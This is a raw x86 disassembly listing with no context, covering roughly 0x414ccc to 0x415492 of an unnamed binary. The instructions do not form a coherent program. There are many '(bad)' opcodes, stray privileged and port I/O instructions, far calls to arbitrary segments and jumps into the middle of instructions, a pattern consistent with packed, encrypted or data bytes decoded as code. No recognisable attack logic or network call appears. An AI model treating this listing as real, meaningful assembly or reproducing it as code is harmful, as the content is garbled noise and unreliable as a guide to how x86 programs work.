  414ccc:	mov    ebp,DWORD PTR [eax-0x73]
  414ccf:	ret    
  414cd0:	push   ss
  414cd1:	mov    ecx,0x15a69f0e
  414cd6:	ror    BYTE PTR [ebp+0x53cf9f5a],cl
  414cdc:	push   0x53ff2fdd
  414ce1:	jecxz  0x414c9c
  414ce3:	cmp    DWORD PTR [edi+0x1],edi
  414ce6:	popf   
  414ce7:	pop    ebp
  414ce8:	cmp    esi,DWORD PTR [ebx]
  414cea:	outs   dx,BYTE PTR ds:[esi]
  414ceb:	xchg   ecx,eax
  414cec:	ss in  al,0xb8
  414cef:	mov    edi,DWORD PTR [ebx-0x74]
  414cf2:	mov    esp,0x707d5649
  414cf7:	mov    al,ds:0xc006d106
  414cfc:	xor    BYTE PTR [ebx],0xe1
  414cff:	mov    esp,DWORD PTR [edx]
  414d01:	cld    
  414d02:	or     eax,0x9096a83a
  414d07:	push   esp
  414d08:	adc    BYTE PTR [edx],dh
  414d0a:	fdiv   DWORD PTR [ecx]
  414d0c:	mov    esi,0xa642fc45
  414d11:	add    dl,ah
  414d13:	leave  
  414d14:	jns    0x414d82
  414d16:	mov    dh,0x1f
  414d18:	je     0x414d40
  414d1a:	sbb    bh,0x80
  414d1d:	xor    al,0x2
  414d1f:	mov    cl,0x1e
  414d21:	mov    ebx,0xc32fa8dc
  414d26:	inc    esi
  414d27:	iret   
  414d28:	in     eax,dx
  414d29:	cmp    eax,0xcb6dfbf9
  414d2e:	or     al,0x1c
  414d30:	xor    al,0x17
  414d32:	or     al,0x28
  414d34:	in     al,dx
  414d35:	push   ecx
  414d36:	dec    esp
  414d37:	adc    al,0x6a
  414d39:	add    eax,DWORD PTR [edi+ecx*2+0x8]
  414d3d:	icebp  
  414d3e:	enter  0x5218,0x5c
  414d42:	sub    ebx,ebx
  414d44:	pushf  
  414d45:	mov    cl,0xc7
  414d47:	mov    ds:0xbd5bb8cd,eax
  414d4c:	jp     0x414d2c
  414d4e:	hlt    
  414d4f:	xchg   ebx,eax
  414d50:	mov    WORD PTR [edi+0x79ce63e4],gs
  414d56:	xchg   esi,eax
  414d57:	mov    ds:0xb4613924,eax
  414d5c:	or     dl,0xc9
  414d5f:	and    DWORD PTR [esi+ebx*1-0x41859611],ebp
  414d66:	xor    cl,bl
  414d68:	fild   DWORD PTR [ebx+0x40]
  414d6b:	or     al,0x97
  414d6d:	fs adc eax,0xf1506cf4
  414d73:	aas    
  414d74:	rcl    DWORD PTR [edi+esi*2-0x75],0x12
  414d79:	mov    edi,0xa8ad3e63
  414d7e:	aad    0xf9
  414d80:	jge    0x414d7f
  414d82:	lds    esi,FWORD PTR [eax+0x20ff32b6]
  414d88:	stos   BYTE PTR es:[edi],al
  414d89:	xor    eax,0xc0e34875
  414d8e:	(bad)  
  414d8f:	mov    ah,0xbb
  414d91:	dec    eax
  414d92:	mov    ebx,0x5e1eaedb
  414d97:	or     ch,BYTE PTR [esi]
  414d99:	sub    al,0x6f
  414d9b:	test   al,0x88
  414d9d:	and    al,0xe6
  414d9f:	lds    esp,FWORD PTR [eax]
  414da1:	outs   dx,BYTE PTR ds:[esi]
  414da2:	stos   BYTE PTR es:[edi],al
  414da3:	fist   DWORD PTR [esi-0x37]
  414da6:	sub    eax,0x4319de81
  414dab:	mov    ebp,DWORD PTR [ecx]
  414dad:	scas   eax,DWORD PTR es:[edi]
  414dae:	mov    edx,0xb2b2a7e
  414db3:	ret    0xe2a1
  414db6:	or     BYTE PTR [esi],0x2a
  414db9:	lahf   
  414dba:	and    ebp,eax
  414dbc:	sub    DWORD PTR ds:0x9c311a76,esi
  414dc2:	mov    ds:0x8f14f60a,al
  414dc7:	or     DWORD PTR [eax],esp
  414dc9:	pop    eax
  414dca:	ja     0x414db2
  414dcc:	xchg   ecx,eax
  414dcd:	fs pop es
  414dcf:	mov    BYTE PTR ds:0x9cc9ee78,dl
  414dd5:	hlt    
  414dd6:	aad    0xa1
  414dd8:	add    BYTE PTR [edx-0x7bf42592],bh
  414dde:	mov    ch,0x40
  414de0:	dec    esp
  414de1:	and    ch,BYTE PTR [ebp+0x17]
  414de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de5:	in     al,dx
  414de6:	xchg   ecx,eax
  414de7:	mov    bl,0xa8
  414de9:	es pushf 
  414deb:	push   eax
  414dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ded:	repz in eax,dx
  414def:	lea    edi,[eax]
  414df1:	and    al,0xbc
  414df3:	mov    eax,ds:0xf41216d0
  414df8:	cwde   
  414df9:	mov    al,0xa
  414dfb:	pop    ebx
  414dfc:	ret    0xa511
  414dff:	jl     0x414e78
  414e01:	jnp    0x414db5
  414e03:	push   ds
  414e04:	in     al,0x24
  414e06:	mov    eax,ebx
  414e08:	fsub   QWORD PTR [esi+edi*8]
  414e0b:	retf   0xb9c4
  414e0e:	jb     0x414ddf
  414e10:	push   edi
  414e11:	add    al,0x36
  414e13:	sbb    dh,al
  414e15:	mov    edx,0x3482f356
  414e1a:	sbb    dh,dh
  414e1c:	and    al,0x33
  414e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1f:	call   0x5faaa624
  414e24:	dec    esp
  414e25:	lds    esp,FWORD PTR [edx+0x3a50c3c7]
  414e2b:	pop    ebx
  414e2c:	shl    DWORD PTR [ebx+0x5c],1
  414e2f:	jno    0x414e5d
  414e31:	jb     0x414dd5
  414e33:	and    BYTE PTR [ebx],ch
  414e35:	pop    esi
  414e36:	push   ds
  414e37:	enter  0x9859,0x48
  414e3b:	rcl    DWORD PTR [eax],1
  414e3d:	jl     0x414e2f
  414e3f:	pop    ecx
  414e40:	lods   al,BYTE PTR ds:[esi]
  414e41:	fcmovnbe st,st(7)
  414e43:	inc    edi
  414e44:	xor    al,0x86
  414e46:	test   BYTE PTR [ebp+0x705ffbc3],0x68
  414e4d:	sub    al,dl
  414e4f:	add    DWORD PTR [esi+0x369ef6e4],0x51
  414e56:	pop    eax
  414e57:	add    al,0x1b
  414e59:	call   0x6997:0xd8831e51
  414e60:	mov    edi,0x1394873a
  414e65:	mov    esp,DWORD PTR [ebx]
  414e67:	cmp    bl,BYTE PTR [ebp-0x6319d23d]
  414e6d:	shl    dh,1
  414e6f:	xlat   BYTE PTR ds:[ebx]
  414e70:	pop    edi
  414e71:	or     edx,DWORD PTR [ecx+0x79d61a1a]
  414e77:	outs   dx,BYTE PTR ds:[esi]
  414e78:	jo     0x414e25
  414e7a:	and    DWORD PTR [ecx],esi
  414e7c:	(bad)  
  414e7d:	cmc    
  414e7e:	(bad)  
  414e7f:	enter  0xaeb1,0x7a
  414e83:	or     eax,0x5ee366f5
  414e88:	xchg   ebx,eax
  414e89:	xor    BYTE PTR [ecx+eiz*4+0x604d66d9],al
  414e90:	xchg   esi,eax
  414e91:	test   BYTE PTR [ebx-0x54],al
  414e94:	std    
  414e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e96:	clc    
  414e97:	sbb    DWORD PTR [eax-0x763a938d],edx
  414e9d:	gs mov al,0xa0
  414ea0:	out    dx,eax
  414ea1:	inc    ebp
  414ea2:	lods   eax,DWORD PTR ds:[esi]
  414ea3:	xchg   esi,eax
  414ea4:	pop    edx
  414ea5:	lock lods al,BYTE PTR ds:[esi]
  414ea7:	mov    al,ds:0x263e0ade
  414eac:	fcomp  QWORD PTR [edx-0x68158019]
  414eb2:	nop
  414eb3:	inc    edx
  414eb4:	lahf   
  414eb5:	xchg   edx,eax
  414eb6:	shl    bh,0x8b
  414eb9:	mov    ch,0x98
  414ebb:	xchg   ebx,eax
  414ebc:	je     0x414ef2
  414ebe:	sub    BYTE PTR [edx+0x24],0x43
  414ec2:	push   ss
  414ec3:	mov    ebx,eax
  414ec5:	inc    edx
  414ec6:	dec    eax
  414ec7:	mov    DWORD PTR [edi+0x2b],ebx
  414eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ecb:	cmp    ebp,edx
  414ecd:	push   cs
  414ece:	outs   dx,DWORD PTR ds:[esi]
  414ecf:	sbb    ah,BYTE PTR [edi-0x161bb154]
  414ed5:	adc    eax,0x329cf6c7
  414eda:	xor    DWORD PTR [edx],eax
  414edc:	ss pushf 
  414ede:	cs jge 0x414f59
  414ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee2:	sub    eax,0xeb4f5d2b
  414ee7:	push   0xc64e90a1
  414eec:	xor    eax,0xa0d01b4f
  414ef1:	xor    ecx,DWORD PTR [edi]
  414ef3:	jne    0x414efb
  414ef5:	push   0x5e
  414ef7:	pusha  
  414ef8:	push   es
  414ef9:	pop    ebp
  414efa:	xchg   ebp,eax
  414efb:	xchg   esp,eax
  414efc:	push   0xf074a69c
  414f01:	jno    0x414ee6
  414f03:	lods   al,BYTE PTR ds:[esi]
  414f04:	inc    esi
  414f05:	lods   eax,DWORD PTR ds:[esi]
  414f06:	loopne 0x414f76
  414f08:	pop    ebx
  414f09:	lds    eax,FWORD PTR ds:[ebx+0x2c]
  414f0d:	cld    
  414f0e:	std    
  414f0f:	sahf   
  414f10:	add    eax,0xece71dad
  414f15:	or     BYTE PTR [eax],al
  414f17:	cwde   
  414f18:	mov    ah,0x33
  414f1a:	jge    0x414f12
  414f1c:	repz inc esp
  414f1e:	out    0xfd,al
  414f20:	call   edi
  414f22:	add    BYTE PTR [ebx],0xb8
  414f25:	leave  
  414f26:	inc    ecx
  414f27:	mov    ebx,DWORD PTR [ecx-0x21]
  414f2a:	jecxz  0x414f07
  414f2c:	ret    0xa007
  414f2f:	mov    cl,0xfe
  414f31:	xchg   ebp,eax
  414f32:	sbb    eax,0xc25bccd3
  414f37:	jns    0x414fa1
  414f39:	push   0x990d5c4e
  414f3e:	inc    ecx
  414f3f:	sbb    ebx,DWORD PTR [ebp+0x44ae7d87]
  414f45:	adc    ah,BYTE PTR ds:0x7c854b6e
  414f4b:	jmp    0xd4a4:0xc11f8e5f
  414f52:	mul    BYTE PTR [esp+ebx*1]
  414f55:	and    al,0xed
  414f57:	into   
  414f58:	xor    eax,0x4b74af59
  414f5d:	cmp    DWORD PTR [eax+esi*2],eax
  414f60:	aad    0xef
  414f62:	xchg   edx,eax
  414f63:	ret    
  414f64:	div    DWORD PTR [edx+0x3c7ad731]
  414f6a:	into   
  414f6b:	nop
  414f6c:	stos   DWORD PTR es:[edi],eax
  414f6d:	fsubr  st,st(2)
  414f6f:	add    bl,BYTE PTR [edi-0x28]
  414f72:	cmp    al,0xea
  414f74:	cli    
  414f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f76:	cmc    
  414f77:	jecxz  0x414fbf
  414f79:	pop    DWORD PTR [edi+0x1091ca4]
  414f7f:	cmp    DWORD PTR [ebx-0x109d2a49],0xffffff89
  414f86:	inc    edx
  414f87:	(bad)  
  414f88:	xor    ah,BYTE PTR [ebp+0x61014d3a]
  414f8e:	pop    ebx
  414f8f:	push   esp
  414f90:	cmp    DWORD PTR [ecx+edi*2-0x23],0xacb8fa53
  414f98:	(bad)  
  414f9a:	jns    0x414fce
  414f9c:	mov    edx,ss
  414f9e:	adc    dl,bl
  414fa0:	inc    edx
  414fa1:	cmp    al,0xc3
  414fa3:	pop    ss
  414fa4:	xor    eax,0xffead55e
  414fa9:	popf   
  414faa:	and    DWORD PTR [edx-0x54],edx
  414fad:	les    edx,FWORD PTR [eax]
  414faf:	daa    
  414fb0:	lods   eax,DWORD PTR ds:[esi]
  414fb1:	ins    BYTE PTR es:[edi],dx
  414fb2:	add    DWORD PTR ds:0x3d2f0002,esp
  414fb8:	mov    gs,WORD PTR es:[eax]
  414fbb:	retf   
  414fbc:	jge    0x414f5f
  414fbe:	repnz or BYTE PTR ds:0xf389fe72,0x74
  414fc6:	and    esp,ecx
  414fc8:	gs or  cl,bl
  414fcb:	jle    0x414ff2
  414fcd:	sbb    BYTE PTR [esp+edx*8-0x15c22643],0x4e
  414fd5:	ficomp DWORD PTR [eax]
  414fd7:	jbe    0x414f78
  414fd9:	sub    DWORD PTR ds:0x24c9c6ee,esp
  414fdf:	jbe    0x414f7c
  414fe1:	xor    edx,DWORD PTR [ebx+0x59]
  414fe4:	cmp    eax,0x5a5f1d0d
  414fe9:	ja     0x415039
  414feb:	xchg   edi,eax
  414fec:	adc    eax,0x5031701a
  414ff1:	out    0xcd,al
  414ff3:	and    BYTE PTR [edx],dl
  414ff5:	fldcw  WORD PTR [ecx-0x6d]
  414ff8:	imul   edi,ebp,0xffffffe5
  414ffb:	adc    al,0x8e
  414ffd:	pushf  
  414ffe:	retf   0xc39d
  415001:	outs   dx,DWORD PTR ds:[esi]
  415002:	int    0xea
  415004:	mov    al,ds:0x663cf1f4
  415009:	pop    edi
  41500a:	mov    esi,0xfc1fc7f
  41500f:	adc    BYTE PTR [ebx],bh
  415011:	outs   dx,BYTE PTR ds:[esi]
  415012:	test   BYTE PTR [ebx],bh
  415014:	pop    ecx
  415015:	loope  0x41501e
  415017:	ins    DWORD PTR es:[edi],dx
  415018:	shr    BYTE PTR [eax-0x160bac57],cl
  41501e:	ret    0x89e8
  415021:	(bad)  
  415022:	(bad)  
  415023:	mov    edx,ebx
  415025:	call   0x7cd5:0x483a5bac
  41502c:	mov    DWORD PTR [eax],esi
  41502e:	aam    0x2b
  415030:	mov    edi,gs
  415032:	adc    DWORD PTR [edx+eax*4],esi
  415035:	xor    al,0x3b
  415037:	or     DWORD PTR [edi],edi
  415039:	xor    al,0xb4
  41503b:	jmp    0x4e1133d9
  415040:	sub    dl,BYTE PTR [ecx-0x8f45b4c]
  415046:	mov    ch,0xd6
  415048:	push   ebx
  415049:	fisttp QWORD PTR [esi]
  41504b:	mov    ecx,0xc2b6af47
  415050:	xchg   DWORD PTR [ebx-0x6],eax
  415053:	lahf   
  415054:	mov    ebx,cs
  415056:	int3   
  415057:	mov    edx,0xf22ec652
  41505c:	adc    DWORD PTR [edi+0x7bd2c1d1],ebp
  415062:	data16 (bad) 
  415064:	cmp    al,BYTE PTR [edx+0xd]
  415067:	mov    bl,0xb6
  415069:	(bad)  
  41506a:	mov    edi,0xedc75e91
  41506f:	popa   
  415070:	int3   
  415071:	push   ss
  415072:	vpsrlq xmm4,xmm0,XMMWORD PTR [esi]
  415076:	bound  ebp,QWORD PTR [ecx+0x24]
  415079:	mov    al,0x97
  41507b:	sub    cl,ah
  41507d:	xchg   ebp,eax
  41507e:	into   
  41507f:	scas   al,BYTE PTR es:[edi]
  415080:	lock gs das 
  415083:	cmp    esi,edi
  415085:	cmp    BYTE PTR [ebp-0x14021437],dh
  41508b:	fidivr DWORD PTR [ebx]
  41508d:	mov    ds:0x62e592,eax
  415092:	lods   al,BYTE PTR ds:[esi]
  415093:	add    BYTE PTR [ebp-0x58fa7dc9],dl
  415099:	inc    esi
  41509a:	and    ecx,ebx
  41509c:	fwait
  41509d:	call   0x42ac:0xccc47933
  4150a4:	or     BYTE PTR ds:0xe332851b,0xfc
  4150ab:	push   edx
  4150ac:	into   
  4150ad:	cld    
  4150ae:	inc    ebx
  4150af:	mov    bl,ah
  4150b1:	inc    edi
  4150b2:	mov    ch,0x39
  4150b4:	les    esp,FWORD PTR [eax]
  4150b6:	int3   
  4150b7:	rcl    DWORD PTR [ecx],cl
  4150b9:	test   eax,0xa526a711
  4150be:	scas   eax,DWORD PTR es:[edi]
  4150bf:	retf   
  4150c0:	sub    DWORD PTR [ebp-0x6],eax
  4150c3:	out    dx,al
  4150c4:	jecxz  0x41508f
  4150c6:	xchg   BYTE PTR [ebp-0x2eae4236],dh
  4150cc:	rcl    ebp,cl
  4150ce:	xchg   ecx,eax
  4150cf:	mov    ecx,0xe74949e1
  4150d4:	icebp  
  4150d5:	clc    
  4150d6:	js     0x415098
  4150d8:	pop    edi
  4150d9:	ficomp DWORD PTR [esi]
  4150db:	lea    ebp,[edi+ebx*4]
  4150de:	stc    
  4150df:	cmp    al,BYTE PTR [ecx]
  4150e1:	xchg   edi,eax
  4150e2:	retf   0xd69d
  4150e5:	and    al,BYTE PTR [esi-0x1398b8ec]
  4150eb:	aam    0xb0
  4150ed:	gs stc 
  4150ef:	(bad)  
  4150f0:	outs   dx,DWORD PTR ds:[esi]
  4150f1:	sub    BYTE PTR [ebx+ecx*1+0x78d214fd],bh
  4150f8:	fdivr  DWORD PTR [ebx+0x7d]
  4150fb:	dec    esp
  4150fc:	scas   al,BYTE PTR es:[edi]
  4150fd:	mov    dl,0xa5
  4150ff:	xchg   edx,eax
  415100:	loopne 0x4150f6
  415102:	data16 aad 0x7e
  415105:	sbb    al,0x28
  415107:	int3   
  415108:	sahf   
  415109:	lea    ecx,[ecx+0x180e94c7]
  41510f:	arpl   WORD PTR [ebp+0x3d],bx
  415112:	cld    
  415113:	(bad)  
  415114:	test   edx,0x22223147
  41511a:	jmp    0x8e389585
  41511f:	or     BYTE PTR [ebx-0x6cc9f4e],ch
  415125:	dec    eax
  415126:	xchg   edx,eax
  415127:	call   0x4475:0x28ea27eb
  41512e:	cdq    
  41512f:	pop    ebx
  415130:	push   edi
  415131:	fwait
  415132:	push   esp
  415133:	lea    ebp,[ecx+0x456094ae]
  415139:	dec    edi
  41513a:	aas    
  41513b:	addr16 mov bl,0x46
  41513e:	popf   
  41513f:	loope  0x415135
  415141:	cs aaa 
  415143:	jae    0x4150ce
  415145:	lds    esp,FWORD PTR [edi]
  415147:	sti    
  415148:	call   0x6faa50c3
  41514d:	cs sub al,0x90
  415150:	adc    bl,cl
  415152:	mov    WORD PTR [edx+ebp*1+0x66476d7b],?
  415159:	add    dl,dh
  41515b:	cs jo  0x415124
  41515e:	dec    esp
  41515f:	jnp    0x415103
  415161:	stos   DWORD PTR es:[edi],eax
  415162:	fs inc esp
  415164:	jle    0x41517e
  415166:	jmp    0x86ba780b
  41516b:	daa    
  41516c:	jp     0x415176
  41516e:	iret   
  41516f:	mov    eax,ds:0x166f505d
  415174:	xchg   edi,eax
  415175:	xchg   ebx,eax
  415176:	(bad)
  415179:	popaw  
  41517b:	ret    0x3079
  41517e:	sub    DWORD PTR [ebp+0x487f6f7a],eax
  415184:	not    DWORD PTR [ebx-0x36]
  415187:	inc    esi
  415188:	test   al,0x17
  41518a:	(bad)
  41518d:	inc    eax
  41518e:	mov    cl,0x76
  415190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415191:	idiv   BYTE PTR [ebp-0x1f8f0170]
  415197:	inc    esi
  415198:	jmp    0x415218
  41519a:	pop    ss
  41519b:	ins    DWORD PTR es:[edi],dx
  41519c:	sbb    DWORD PTR [ebx],esi
  41519e:	cld    
  41519f:	pop    eax
  4151a0:	and    BYTE PTR [ebp-0x5],dh
  4151a3:	cdq    
  4151a4:	sbb    ebx,DWORD PTR [ebx]
  4151a6:	push   ss
  4151a7:	sub    BYTE PTR [esi],dh
  4151a9:	ja     0x4151d2
  4151ab:	cmp    DWORD PTR [edx+0x4650f61],eax
  4151b1:	mov    dl,0xd3
  4151b3:	xchg   esi,esp
  4151b5:	mul    DWORD PTR [ebp-0x4a]
  4151b8:	push   edx
  4151b9:	(bad)  
  4151ba:	xor    eax,0xcbf6f6d5
  4151bf:	adc    cl,al
  4151c1:	pop    edx
  4151c2:	cwde   
  4151c3:	inc    ecx
  4151c4:	jbe    0x415152
  4151c6:	sub    al,0xe2
  4151c8:	out    dx,al
  4151c9:	sbb    BYTE PTR [esp+edi*4+0x281b1816],ah
  4151d0:	es push 0xf02cb5ac
  4151d6:	push   edi
  4151d7:	inc    esi
  4151d8:	popa   
  4151d9:	push   cs
  4151da:	sub    ch,BYTE PTR [ebx]
  4151dc:	mov    al,0x3f
  4151de:	imul   ebp,edi,0x3d
  4151e1:	jl     0x415167
  4151e3:	mov    esp,0xaaabb44a
  4151e8:	sahf   
  4151e9:	nop
  4151ea:	xor    dl,BYTE PTR [edx]
  4151ec:	push   ss
  4151ed:	cs push 0x7a
  4151f0:	sti    
  4151f1:	bound  eax,QWORD PTR [ecx-0x67]
  4151f4:	dec    edx
  4151f5:	inc    esi
  4151f6:	ret    
  4151f7:	pop    edx
  4151f8:	pop    eax
  4151f9:	add    DWORD PTR [edx+0x62],esi
  4151fc:	into   
  4151fd:	dec    edx
  4151fe:	mov    BYTE PTR [edi],ah
  415200:	dec    ecx
  415201:	sar    BYTE PTR [edi*8+0x7d87f4d2],1
  415208:	or     ebp,DWORD PTR [eax+0x29353547]
  41520e:	xor    bh,dl
  415210:	push   ebx
  415211:	dec    ecx
  415212:	push   edx
  415213:	fwait
  415214:	dec    edi
  415215:	mov    bh,0xd6
  415217:	lahf   
  415218:	ins    BYTE PTR es:[edi],dx
  415219:	lock popa 
  41521b:	loop   0x415273
  41521d:	xchg   DWORD PTR [edx+edx*4],esp
  415220:	pop    edx
  415221:	sbb    bl,bl
  415223:	call   0x7feb:0xfa7fc4de
  41522a:	and    BYTE PTR [edx+0x14],al
  41522d:	ja     0x415214
  41522f:	js     0x415235
  415231:	cmc    
  415232:	out    0x22,eax
  415234:	jae    0x4151e7
  415236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415237:	xchg   esi,eax
  415238:	cmp    BYTE PTR [edi-0x17],al
  41523b:	repz loope 0x4152a3
  41523e:	sbb    eax,0x3768e897
  415243:	or     bh,BYTE PTR [edi]
  415245:	fcomp  QWORD PTR [edi+0x2]
  415248:	fstp   DWORD PTR [eax+0x2dd1f24f]
  41524e:	inc    edx
  41524f:	rol    esp,cl
  415251:	test   BYTE PTR [esi-0x488ac668],cl
  415257:	mov    bh,0x6e
  415259:	mov    DWORD PTR [ebp+0x9453f30],edx
  41525f:	and    BYTE PTR [si-0x3564],ch
  415264:	popf   
  415265:	sbb    al,0x31
  415267:	enter  0x885,0xda
  41526b:	outs   dx,DWORD PTR ds:[esi]
  41526c:	mov    esi,0xd6e10480
  415271:	fwait
  415272:	and    eax,0x6323f766
  415277:	jp     0x4152f1
  415279:	fmul   QWORD PTR ds:0x34f65d4c
  41527f:	fld    DWORD PTR [edi-0x54]
  415282:	clc    
  415283:	mov    ebp,0xfc91fc6e
  415288:	ret    
  415289:	and    DWORD PTR [esi-0x1614c17a],eax
  41528f:	dec    eax
  415290:	(bad)  
  415291:	jns    0x415265
  415293:	cmp    BYTE PTR [eax-0x19c0b911],0x2a
  41529a:	(bad)  
  41529b:	xor    al,0xc3
  41529d:	jl     0x415270
  41529f:	push   0x7fbb2082
  4152a4:	ret    0x332e
  4152a7:	and    eax,0xcf05a344
  4152ac:	jg     0x41528a
  4152ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152af:	adc    BYTE PTR [ebx+0x3c],bl
  4152b2:	cmp    BYTE PTR ds:0x9ae8d430,cl
  4152b8:	mov    esp,0xb30a21b2
  4152bd:	mov    es,WORD PTR [ebx-0x28]
  4152c0:	xchg   BYTE PTR [esi],bh
  4152c2:	dec    eax
  4152c3:	mov    ch,0xa6
  4152c6:	jmp    0x15f24819
  4152cb:	ret    
  4152cc:	mov    al,0x52
  4152ce:	mov    al,ds:0xe626f19
  4152d3:	cmp    eax,esi
  4152d5:	push   ecx
  4152d6:	cs repnz xchg ecx,eax
  4152d9:	data16 icebp 
  4152db:	inc    ebp
  4152dc:	fadd   DWORD PTR [eax]
  4152de:	sbb    edi,edx
  4152e0:	hlt    
  4152e1:	sbb    edx,DWORD PTR [esp+edx*1+0x39]
  4152e5:	out    0x90,eax
  4152e7:	ins    BYTE PTR es:[edi],dx
  4152e8:	int    0xc2
  4152ea:	ror    ch,0x73
  4152ed:	mov    esi,ecx
  4152ef:	adc    al,0xe
  4152f1:	jne    0x41533e
  4152f3:	ja     0x4152a7
  4152f5:	and    al,0xd2
  4152f7:	and    edx,DWORD PTR [edi-0x6792f118]
  4152fd:	inc    edi
  4152fe:	sbb    esp,DWORD PTR [ebx+0x53]
  415301:	(bad)  
  415302:	clc    
  415303:	loop   0x415350
  415305:	add    edi,0x9a926642
  41530b:	xor    al,0x72
  41530d:	imul   ebp,edi,0xfffffff3
  415310:	push   edx
  415311:	stos   DWORD PTR es:[edi],eax
  415312:	test   al,0x7d
  415314:	pop    edi
  415315:	stos   BYTE PTR es:[edi],al
  415316:	or     eax,0xdca55ef4
  41531b:	cmp    ebx,ebp
  41531d:	icebp  
  41531e:	mov    al,0x99
  415320:	mov    ah,0xd9
  415322:	fxch   st(6)
  415324:	retf   0xe8e1
  415327:	lds    esi,FWORD PTR [edi-0x223327ba]
  41532d:	sub    al,0xe2
  41532f:	loopne 0x4152ea
  415331:	jmp    0x3281:0x1889b82e
  415338:	xchg   DWORD PTR [edx+0x23031052],eax
  41533e:	inc    edi
  41533f:	in     eax,dx
  415340:	fs test eax,0x8d42328b
  415346:	fstp   DWORD PTR [edx]
  415348:	pop    ss
  415349:	jl     0x4152d6
  41534b:	mov    esi,0xc0b87c01
  415350:	inc    ebx
  415351:	test   dl,ah
  415353:	inc    eax
  415354:	mov    edi,0xc94fc614
  415359:	jmp    0xa083586
  41535e:	sub    DWORD PTR ss:[ecx],esp
  415361:	cs fisubr WORD PTR es:[ecx+ebx*8+0x1e4100c6]
  41536a:	mul    BYTE PTR [edi-0x29]
  41536d:	xchg   ebp,eax
  41536e:	js     0x415321
  415370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415371:	and    al,0xf
  415373:	push   cs
  415374:	sub    al,al
  415376:	dec    ecx
  415377:	xor    ah,BYTE PTR [edx-0x10]
  41537a:	shl    BYTE PTR [ecx+0x15381b3],1
  415380:	shl    BYTE PTR [ecx+0x6a],0x9
  415384:	add    eax,0x3038c3a7
  415389:	push   esi
  41538a:	xchg   ebx,eax
  41538b:	add    dh,BYTE PTR [esi]
  41538d:	mov    ebp,0x49ede557
  415392:	fbstp  TBYTE PTR [edi+0x6d2c57b7]
  415398:	packuswb mm3,QWORD PTR [edx-0x46]
  41539c:	jne    0x41535f
  41539e:	fidiv  DWORD PTR ds:[edi]
  4153a1:	cmp    eax,0x9d375410
  4153a6:	mov    edx,0xca2a2ac
  4153ab:	xor    DWORD PTR [eax+eax*1],ebp
  4153ae:	mov    ?,WORD PTR [ebx+edx*4-0x17]
  4153b2:	push   0xffffffae
  4153b4:	or     al,0x3d
  4153b6:	dec    ebp
  4153b7:	rcl    BYTE PTR [edi-0x42],cl
  4153ba:	inc    eax
  4153bb:	or     edi,DWORD PTR [ecx+0x3008305c]
  4153c1:	push   ds
  4153c2:	adc    edx,0xcb5f0c03
  4153c8:	dec    edx
  4153c9:	push   esi
  4153ca:	mov    bl,0x9f
  4153cc:	aaa    
  4153cd:	imul   ebx,DWORD PTR [eax-0x52],0xa
  4153d1:	xchg   ebp,eax
  4153d2:	jns    0x4153ff
  4153d4:	cmp    al,0x81
  4153d6:	push   ebx
  4153d7:	dec    esi
  4153d8:	jae    0x4153e8
  4153da:	ins    BYTE PTR es:[edi],dx
  4153db:	pop    esi
  4153dc:	sbb    al,0x8
  4153de:	and    DWORD PTR [ecx-0x56afeadf],0xcb1b03e8
  4153e8:	cmp    BYTE PTR ds:0x66516d6e,ah
  4153ee:	stos   BYTE PTR es:[edi],al
  4153ef:	into   
  4153f0:	mov    esi,DWORD PTR [ebx+eiz*4]
  4153f3:	mov    al,0x4
  4153f5:	xchg   DWORD PTR [ecx+0x56400289],eax
  4153fb:	mov    esi,0x50ff206f
  415400:	adc    bl,BYTE PTR [ebp+0x2e1792d2]
  415406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415407:	xlat   BYTE PTR ds:[ebx]
  415408:	pop    ss
  415409:	outs   dx,BYTE PTR ds:[esi]
  41540a:	lods   eax,DWORD PTR ds:[esi]
  41540b:	jno    0x41546c
  41540d:	mov    esp,ecx
  41540f:	mov    al,ds:0xa8a4f531
  415414:	cmp    ebx,DWORD PTR [esp+ebx*2-0x6e]
  415418:	and    eax,0x4386eb24
  41541d:	push   eax
  41541e:	loop   0x4153d7
  415420:	inc    ebx
  415421:	out    dx,al
  415422:	xor    dl,BYTE PTR ds:0x7a7a2b36
  415428:	ds xchg ebx,eax
  41542a:	cmp    eax,0x1d55652b
  41542f:	shl    DWORD PTR [edx-0x51c3f335],cl
  415435:	add    ah,dh
  415437:	clc    
  415438:	stc    
  415439:	pop    edx
  41543a:	push   ds
  41543b:	jne    0x415442
  41543d:	pop    ebp
  41543e:	bound  esi,QWORD PTR [edi+0x5d018a1f]
  415444:	cmp    ebx,DWORD PTR [edx+0x33b0154a]
  41544a:	sbb    BYTE PTR [eax],ah
  41544c:	xor    edx,ebp
  41544e:	rcr    DWORD PTR [esi+0x2d],1
  415451:	jne    0x41540d
  415453:	lahf   
  415454:	xor    BYTE PTR [ebp+0x50],dh
  415457:	in     eax,dx
  415458:	call   edx
  41545a:	jle    0x415445
  41545c:	push   esp
  41545d:	fdivr  DWORD PTR [edx]
  41545f:	icebp  
  415460:	test   BYTE PTR [esi+0x15],al
  415463:	aam    0xfc
  415465:	stos   DWORD PTR es:[edi],eax
  415466:	jae    0x4154a1
  415468:	je     0x4154c8
  41546a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41546b:	push   0xe7e544c2
  415470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415471:	or     al,0x40
  415473:	push   es
  415474:	add    eax,0xcbf26945
  415479:	sub    cl,bh
  41547b:	test   al,0xc4
  41547d:	dec    ebx
  41547e:	add    BYTE PTR [ebx+0x5f],bl
  415481:	jns    0x41546f
  415483:	cdq    
  415484:	cdq    
  415485:	ror    BYTE PTR [edi+0x64d27772],cl
  41548b:	inc    edx
  41548c:	daa    
  41548d:	iret   
  41548e:	in     eax,dx
  41548f:	js     0x4154b8
  415491:	pop    edi
  415492:	push   0xa785e24d
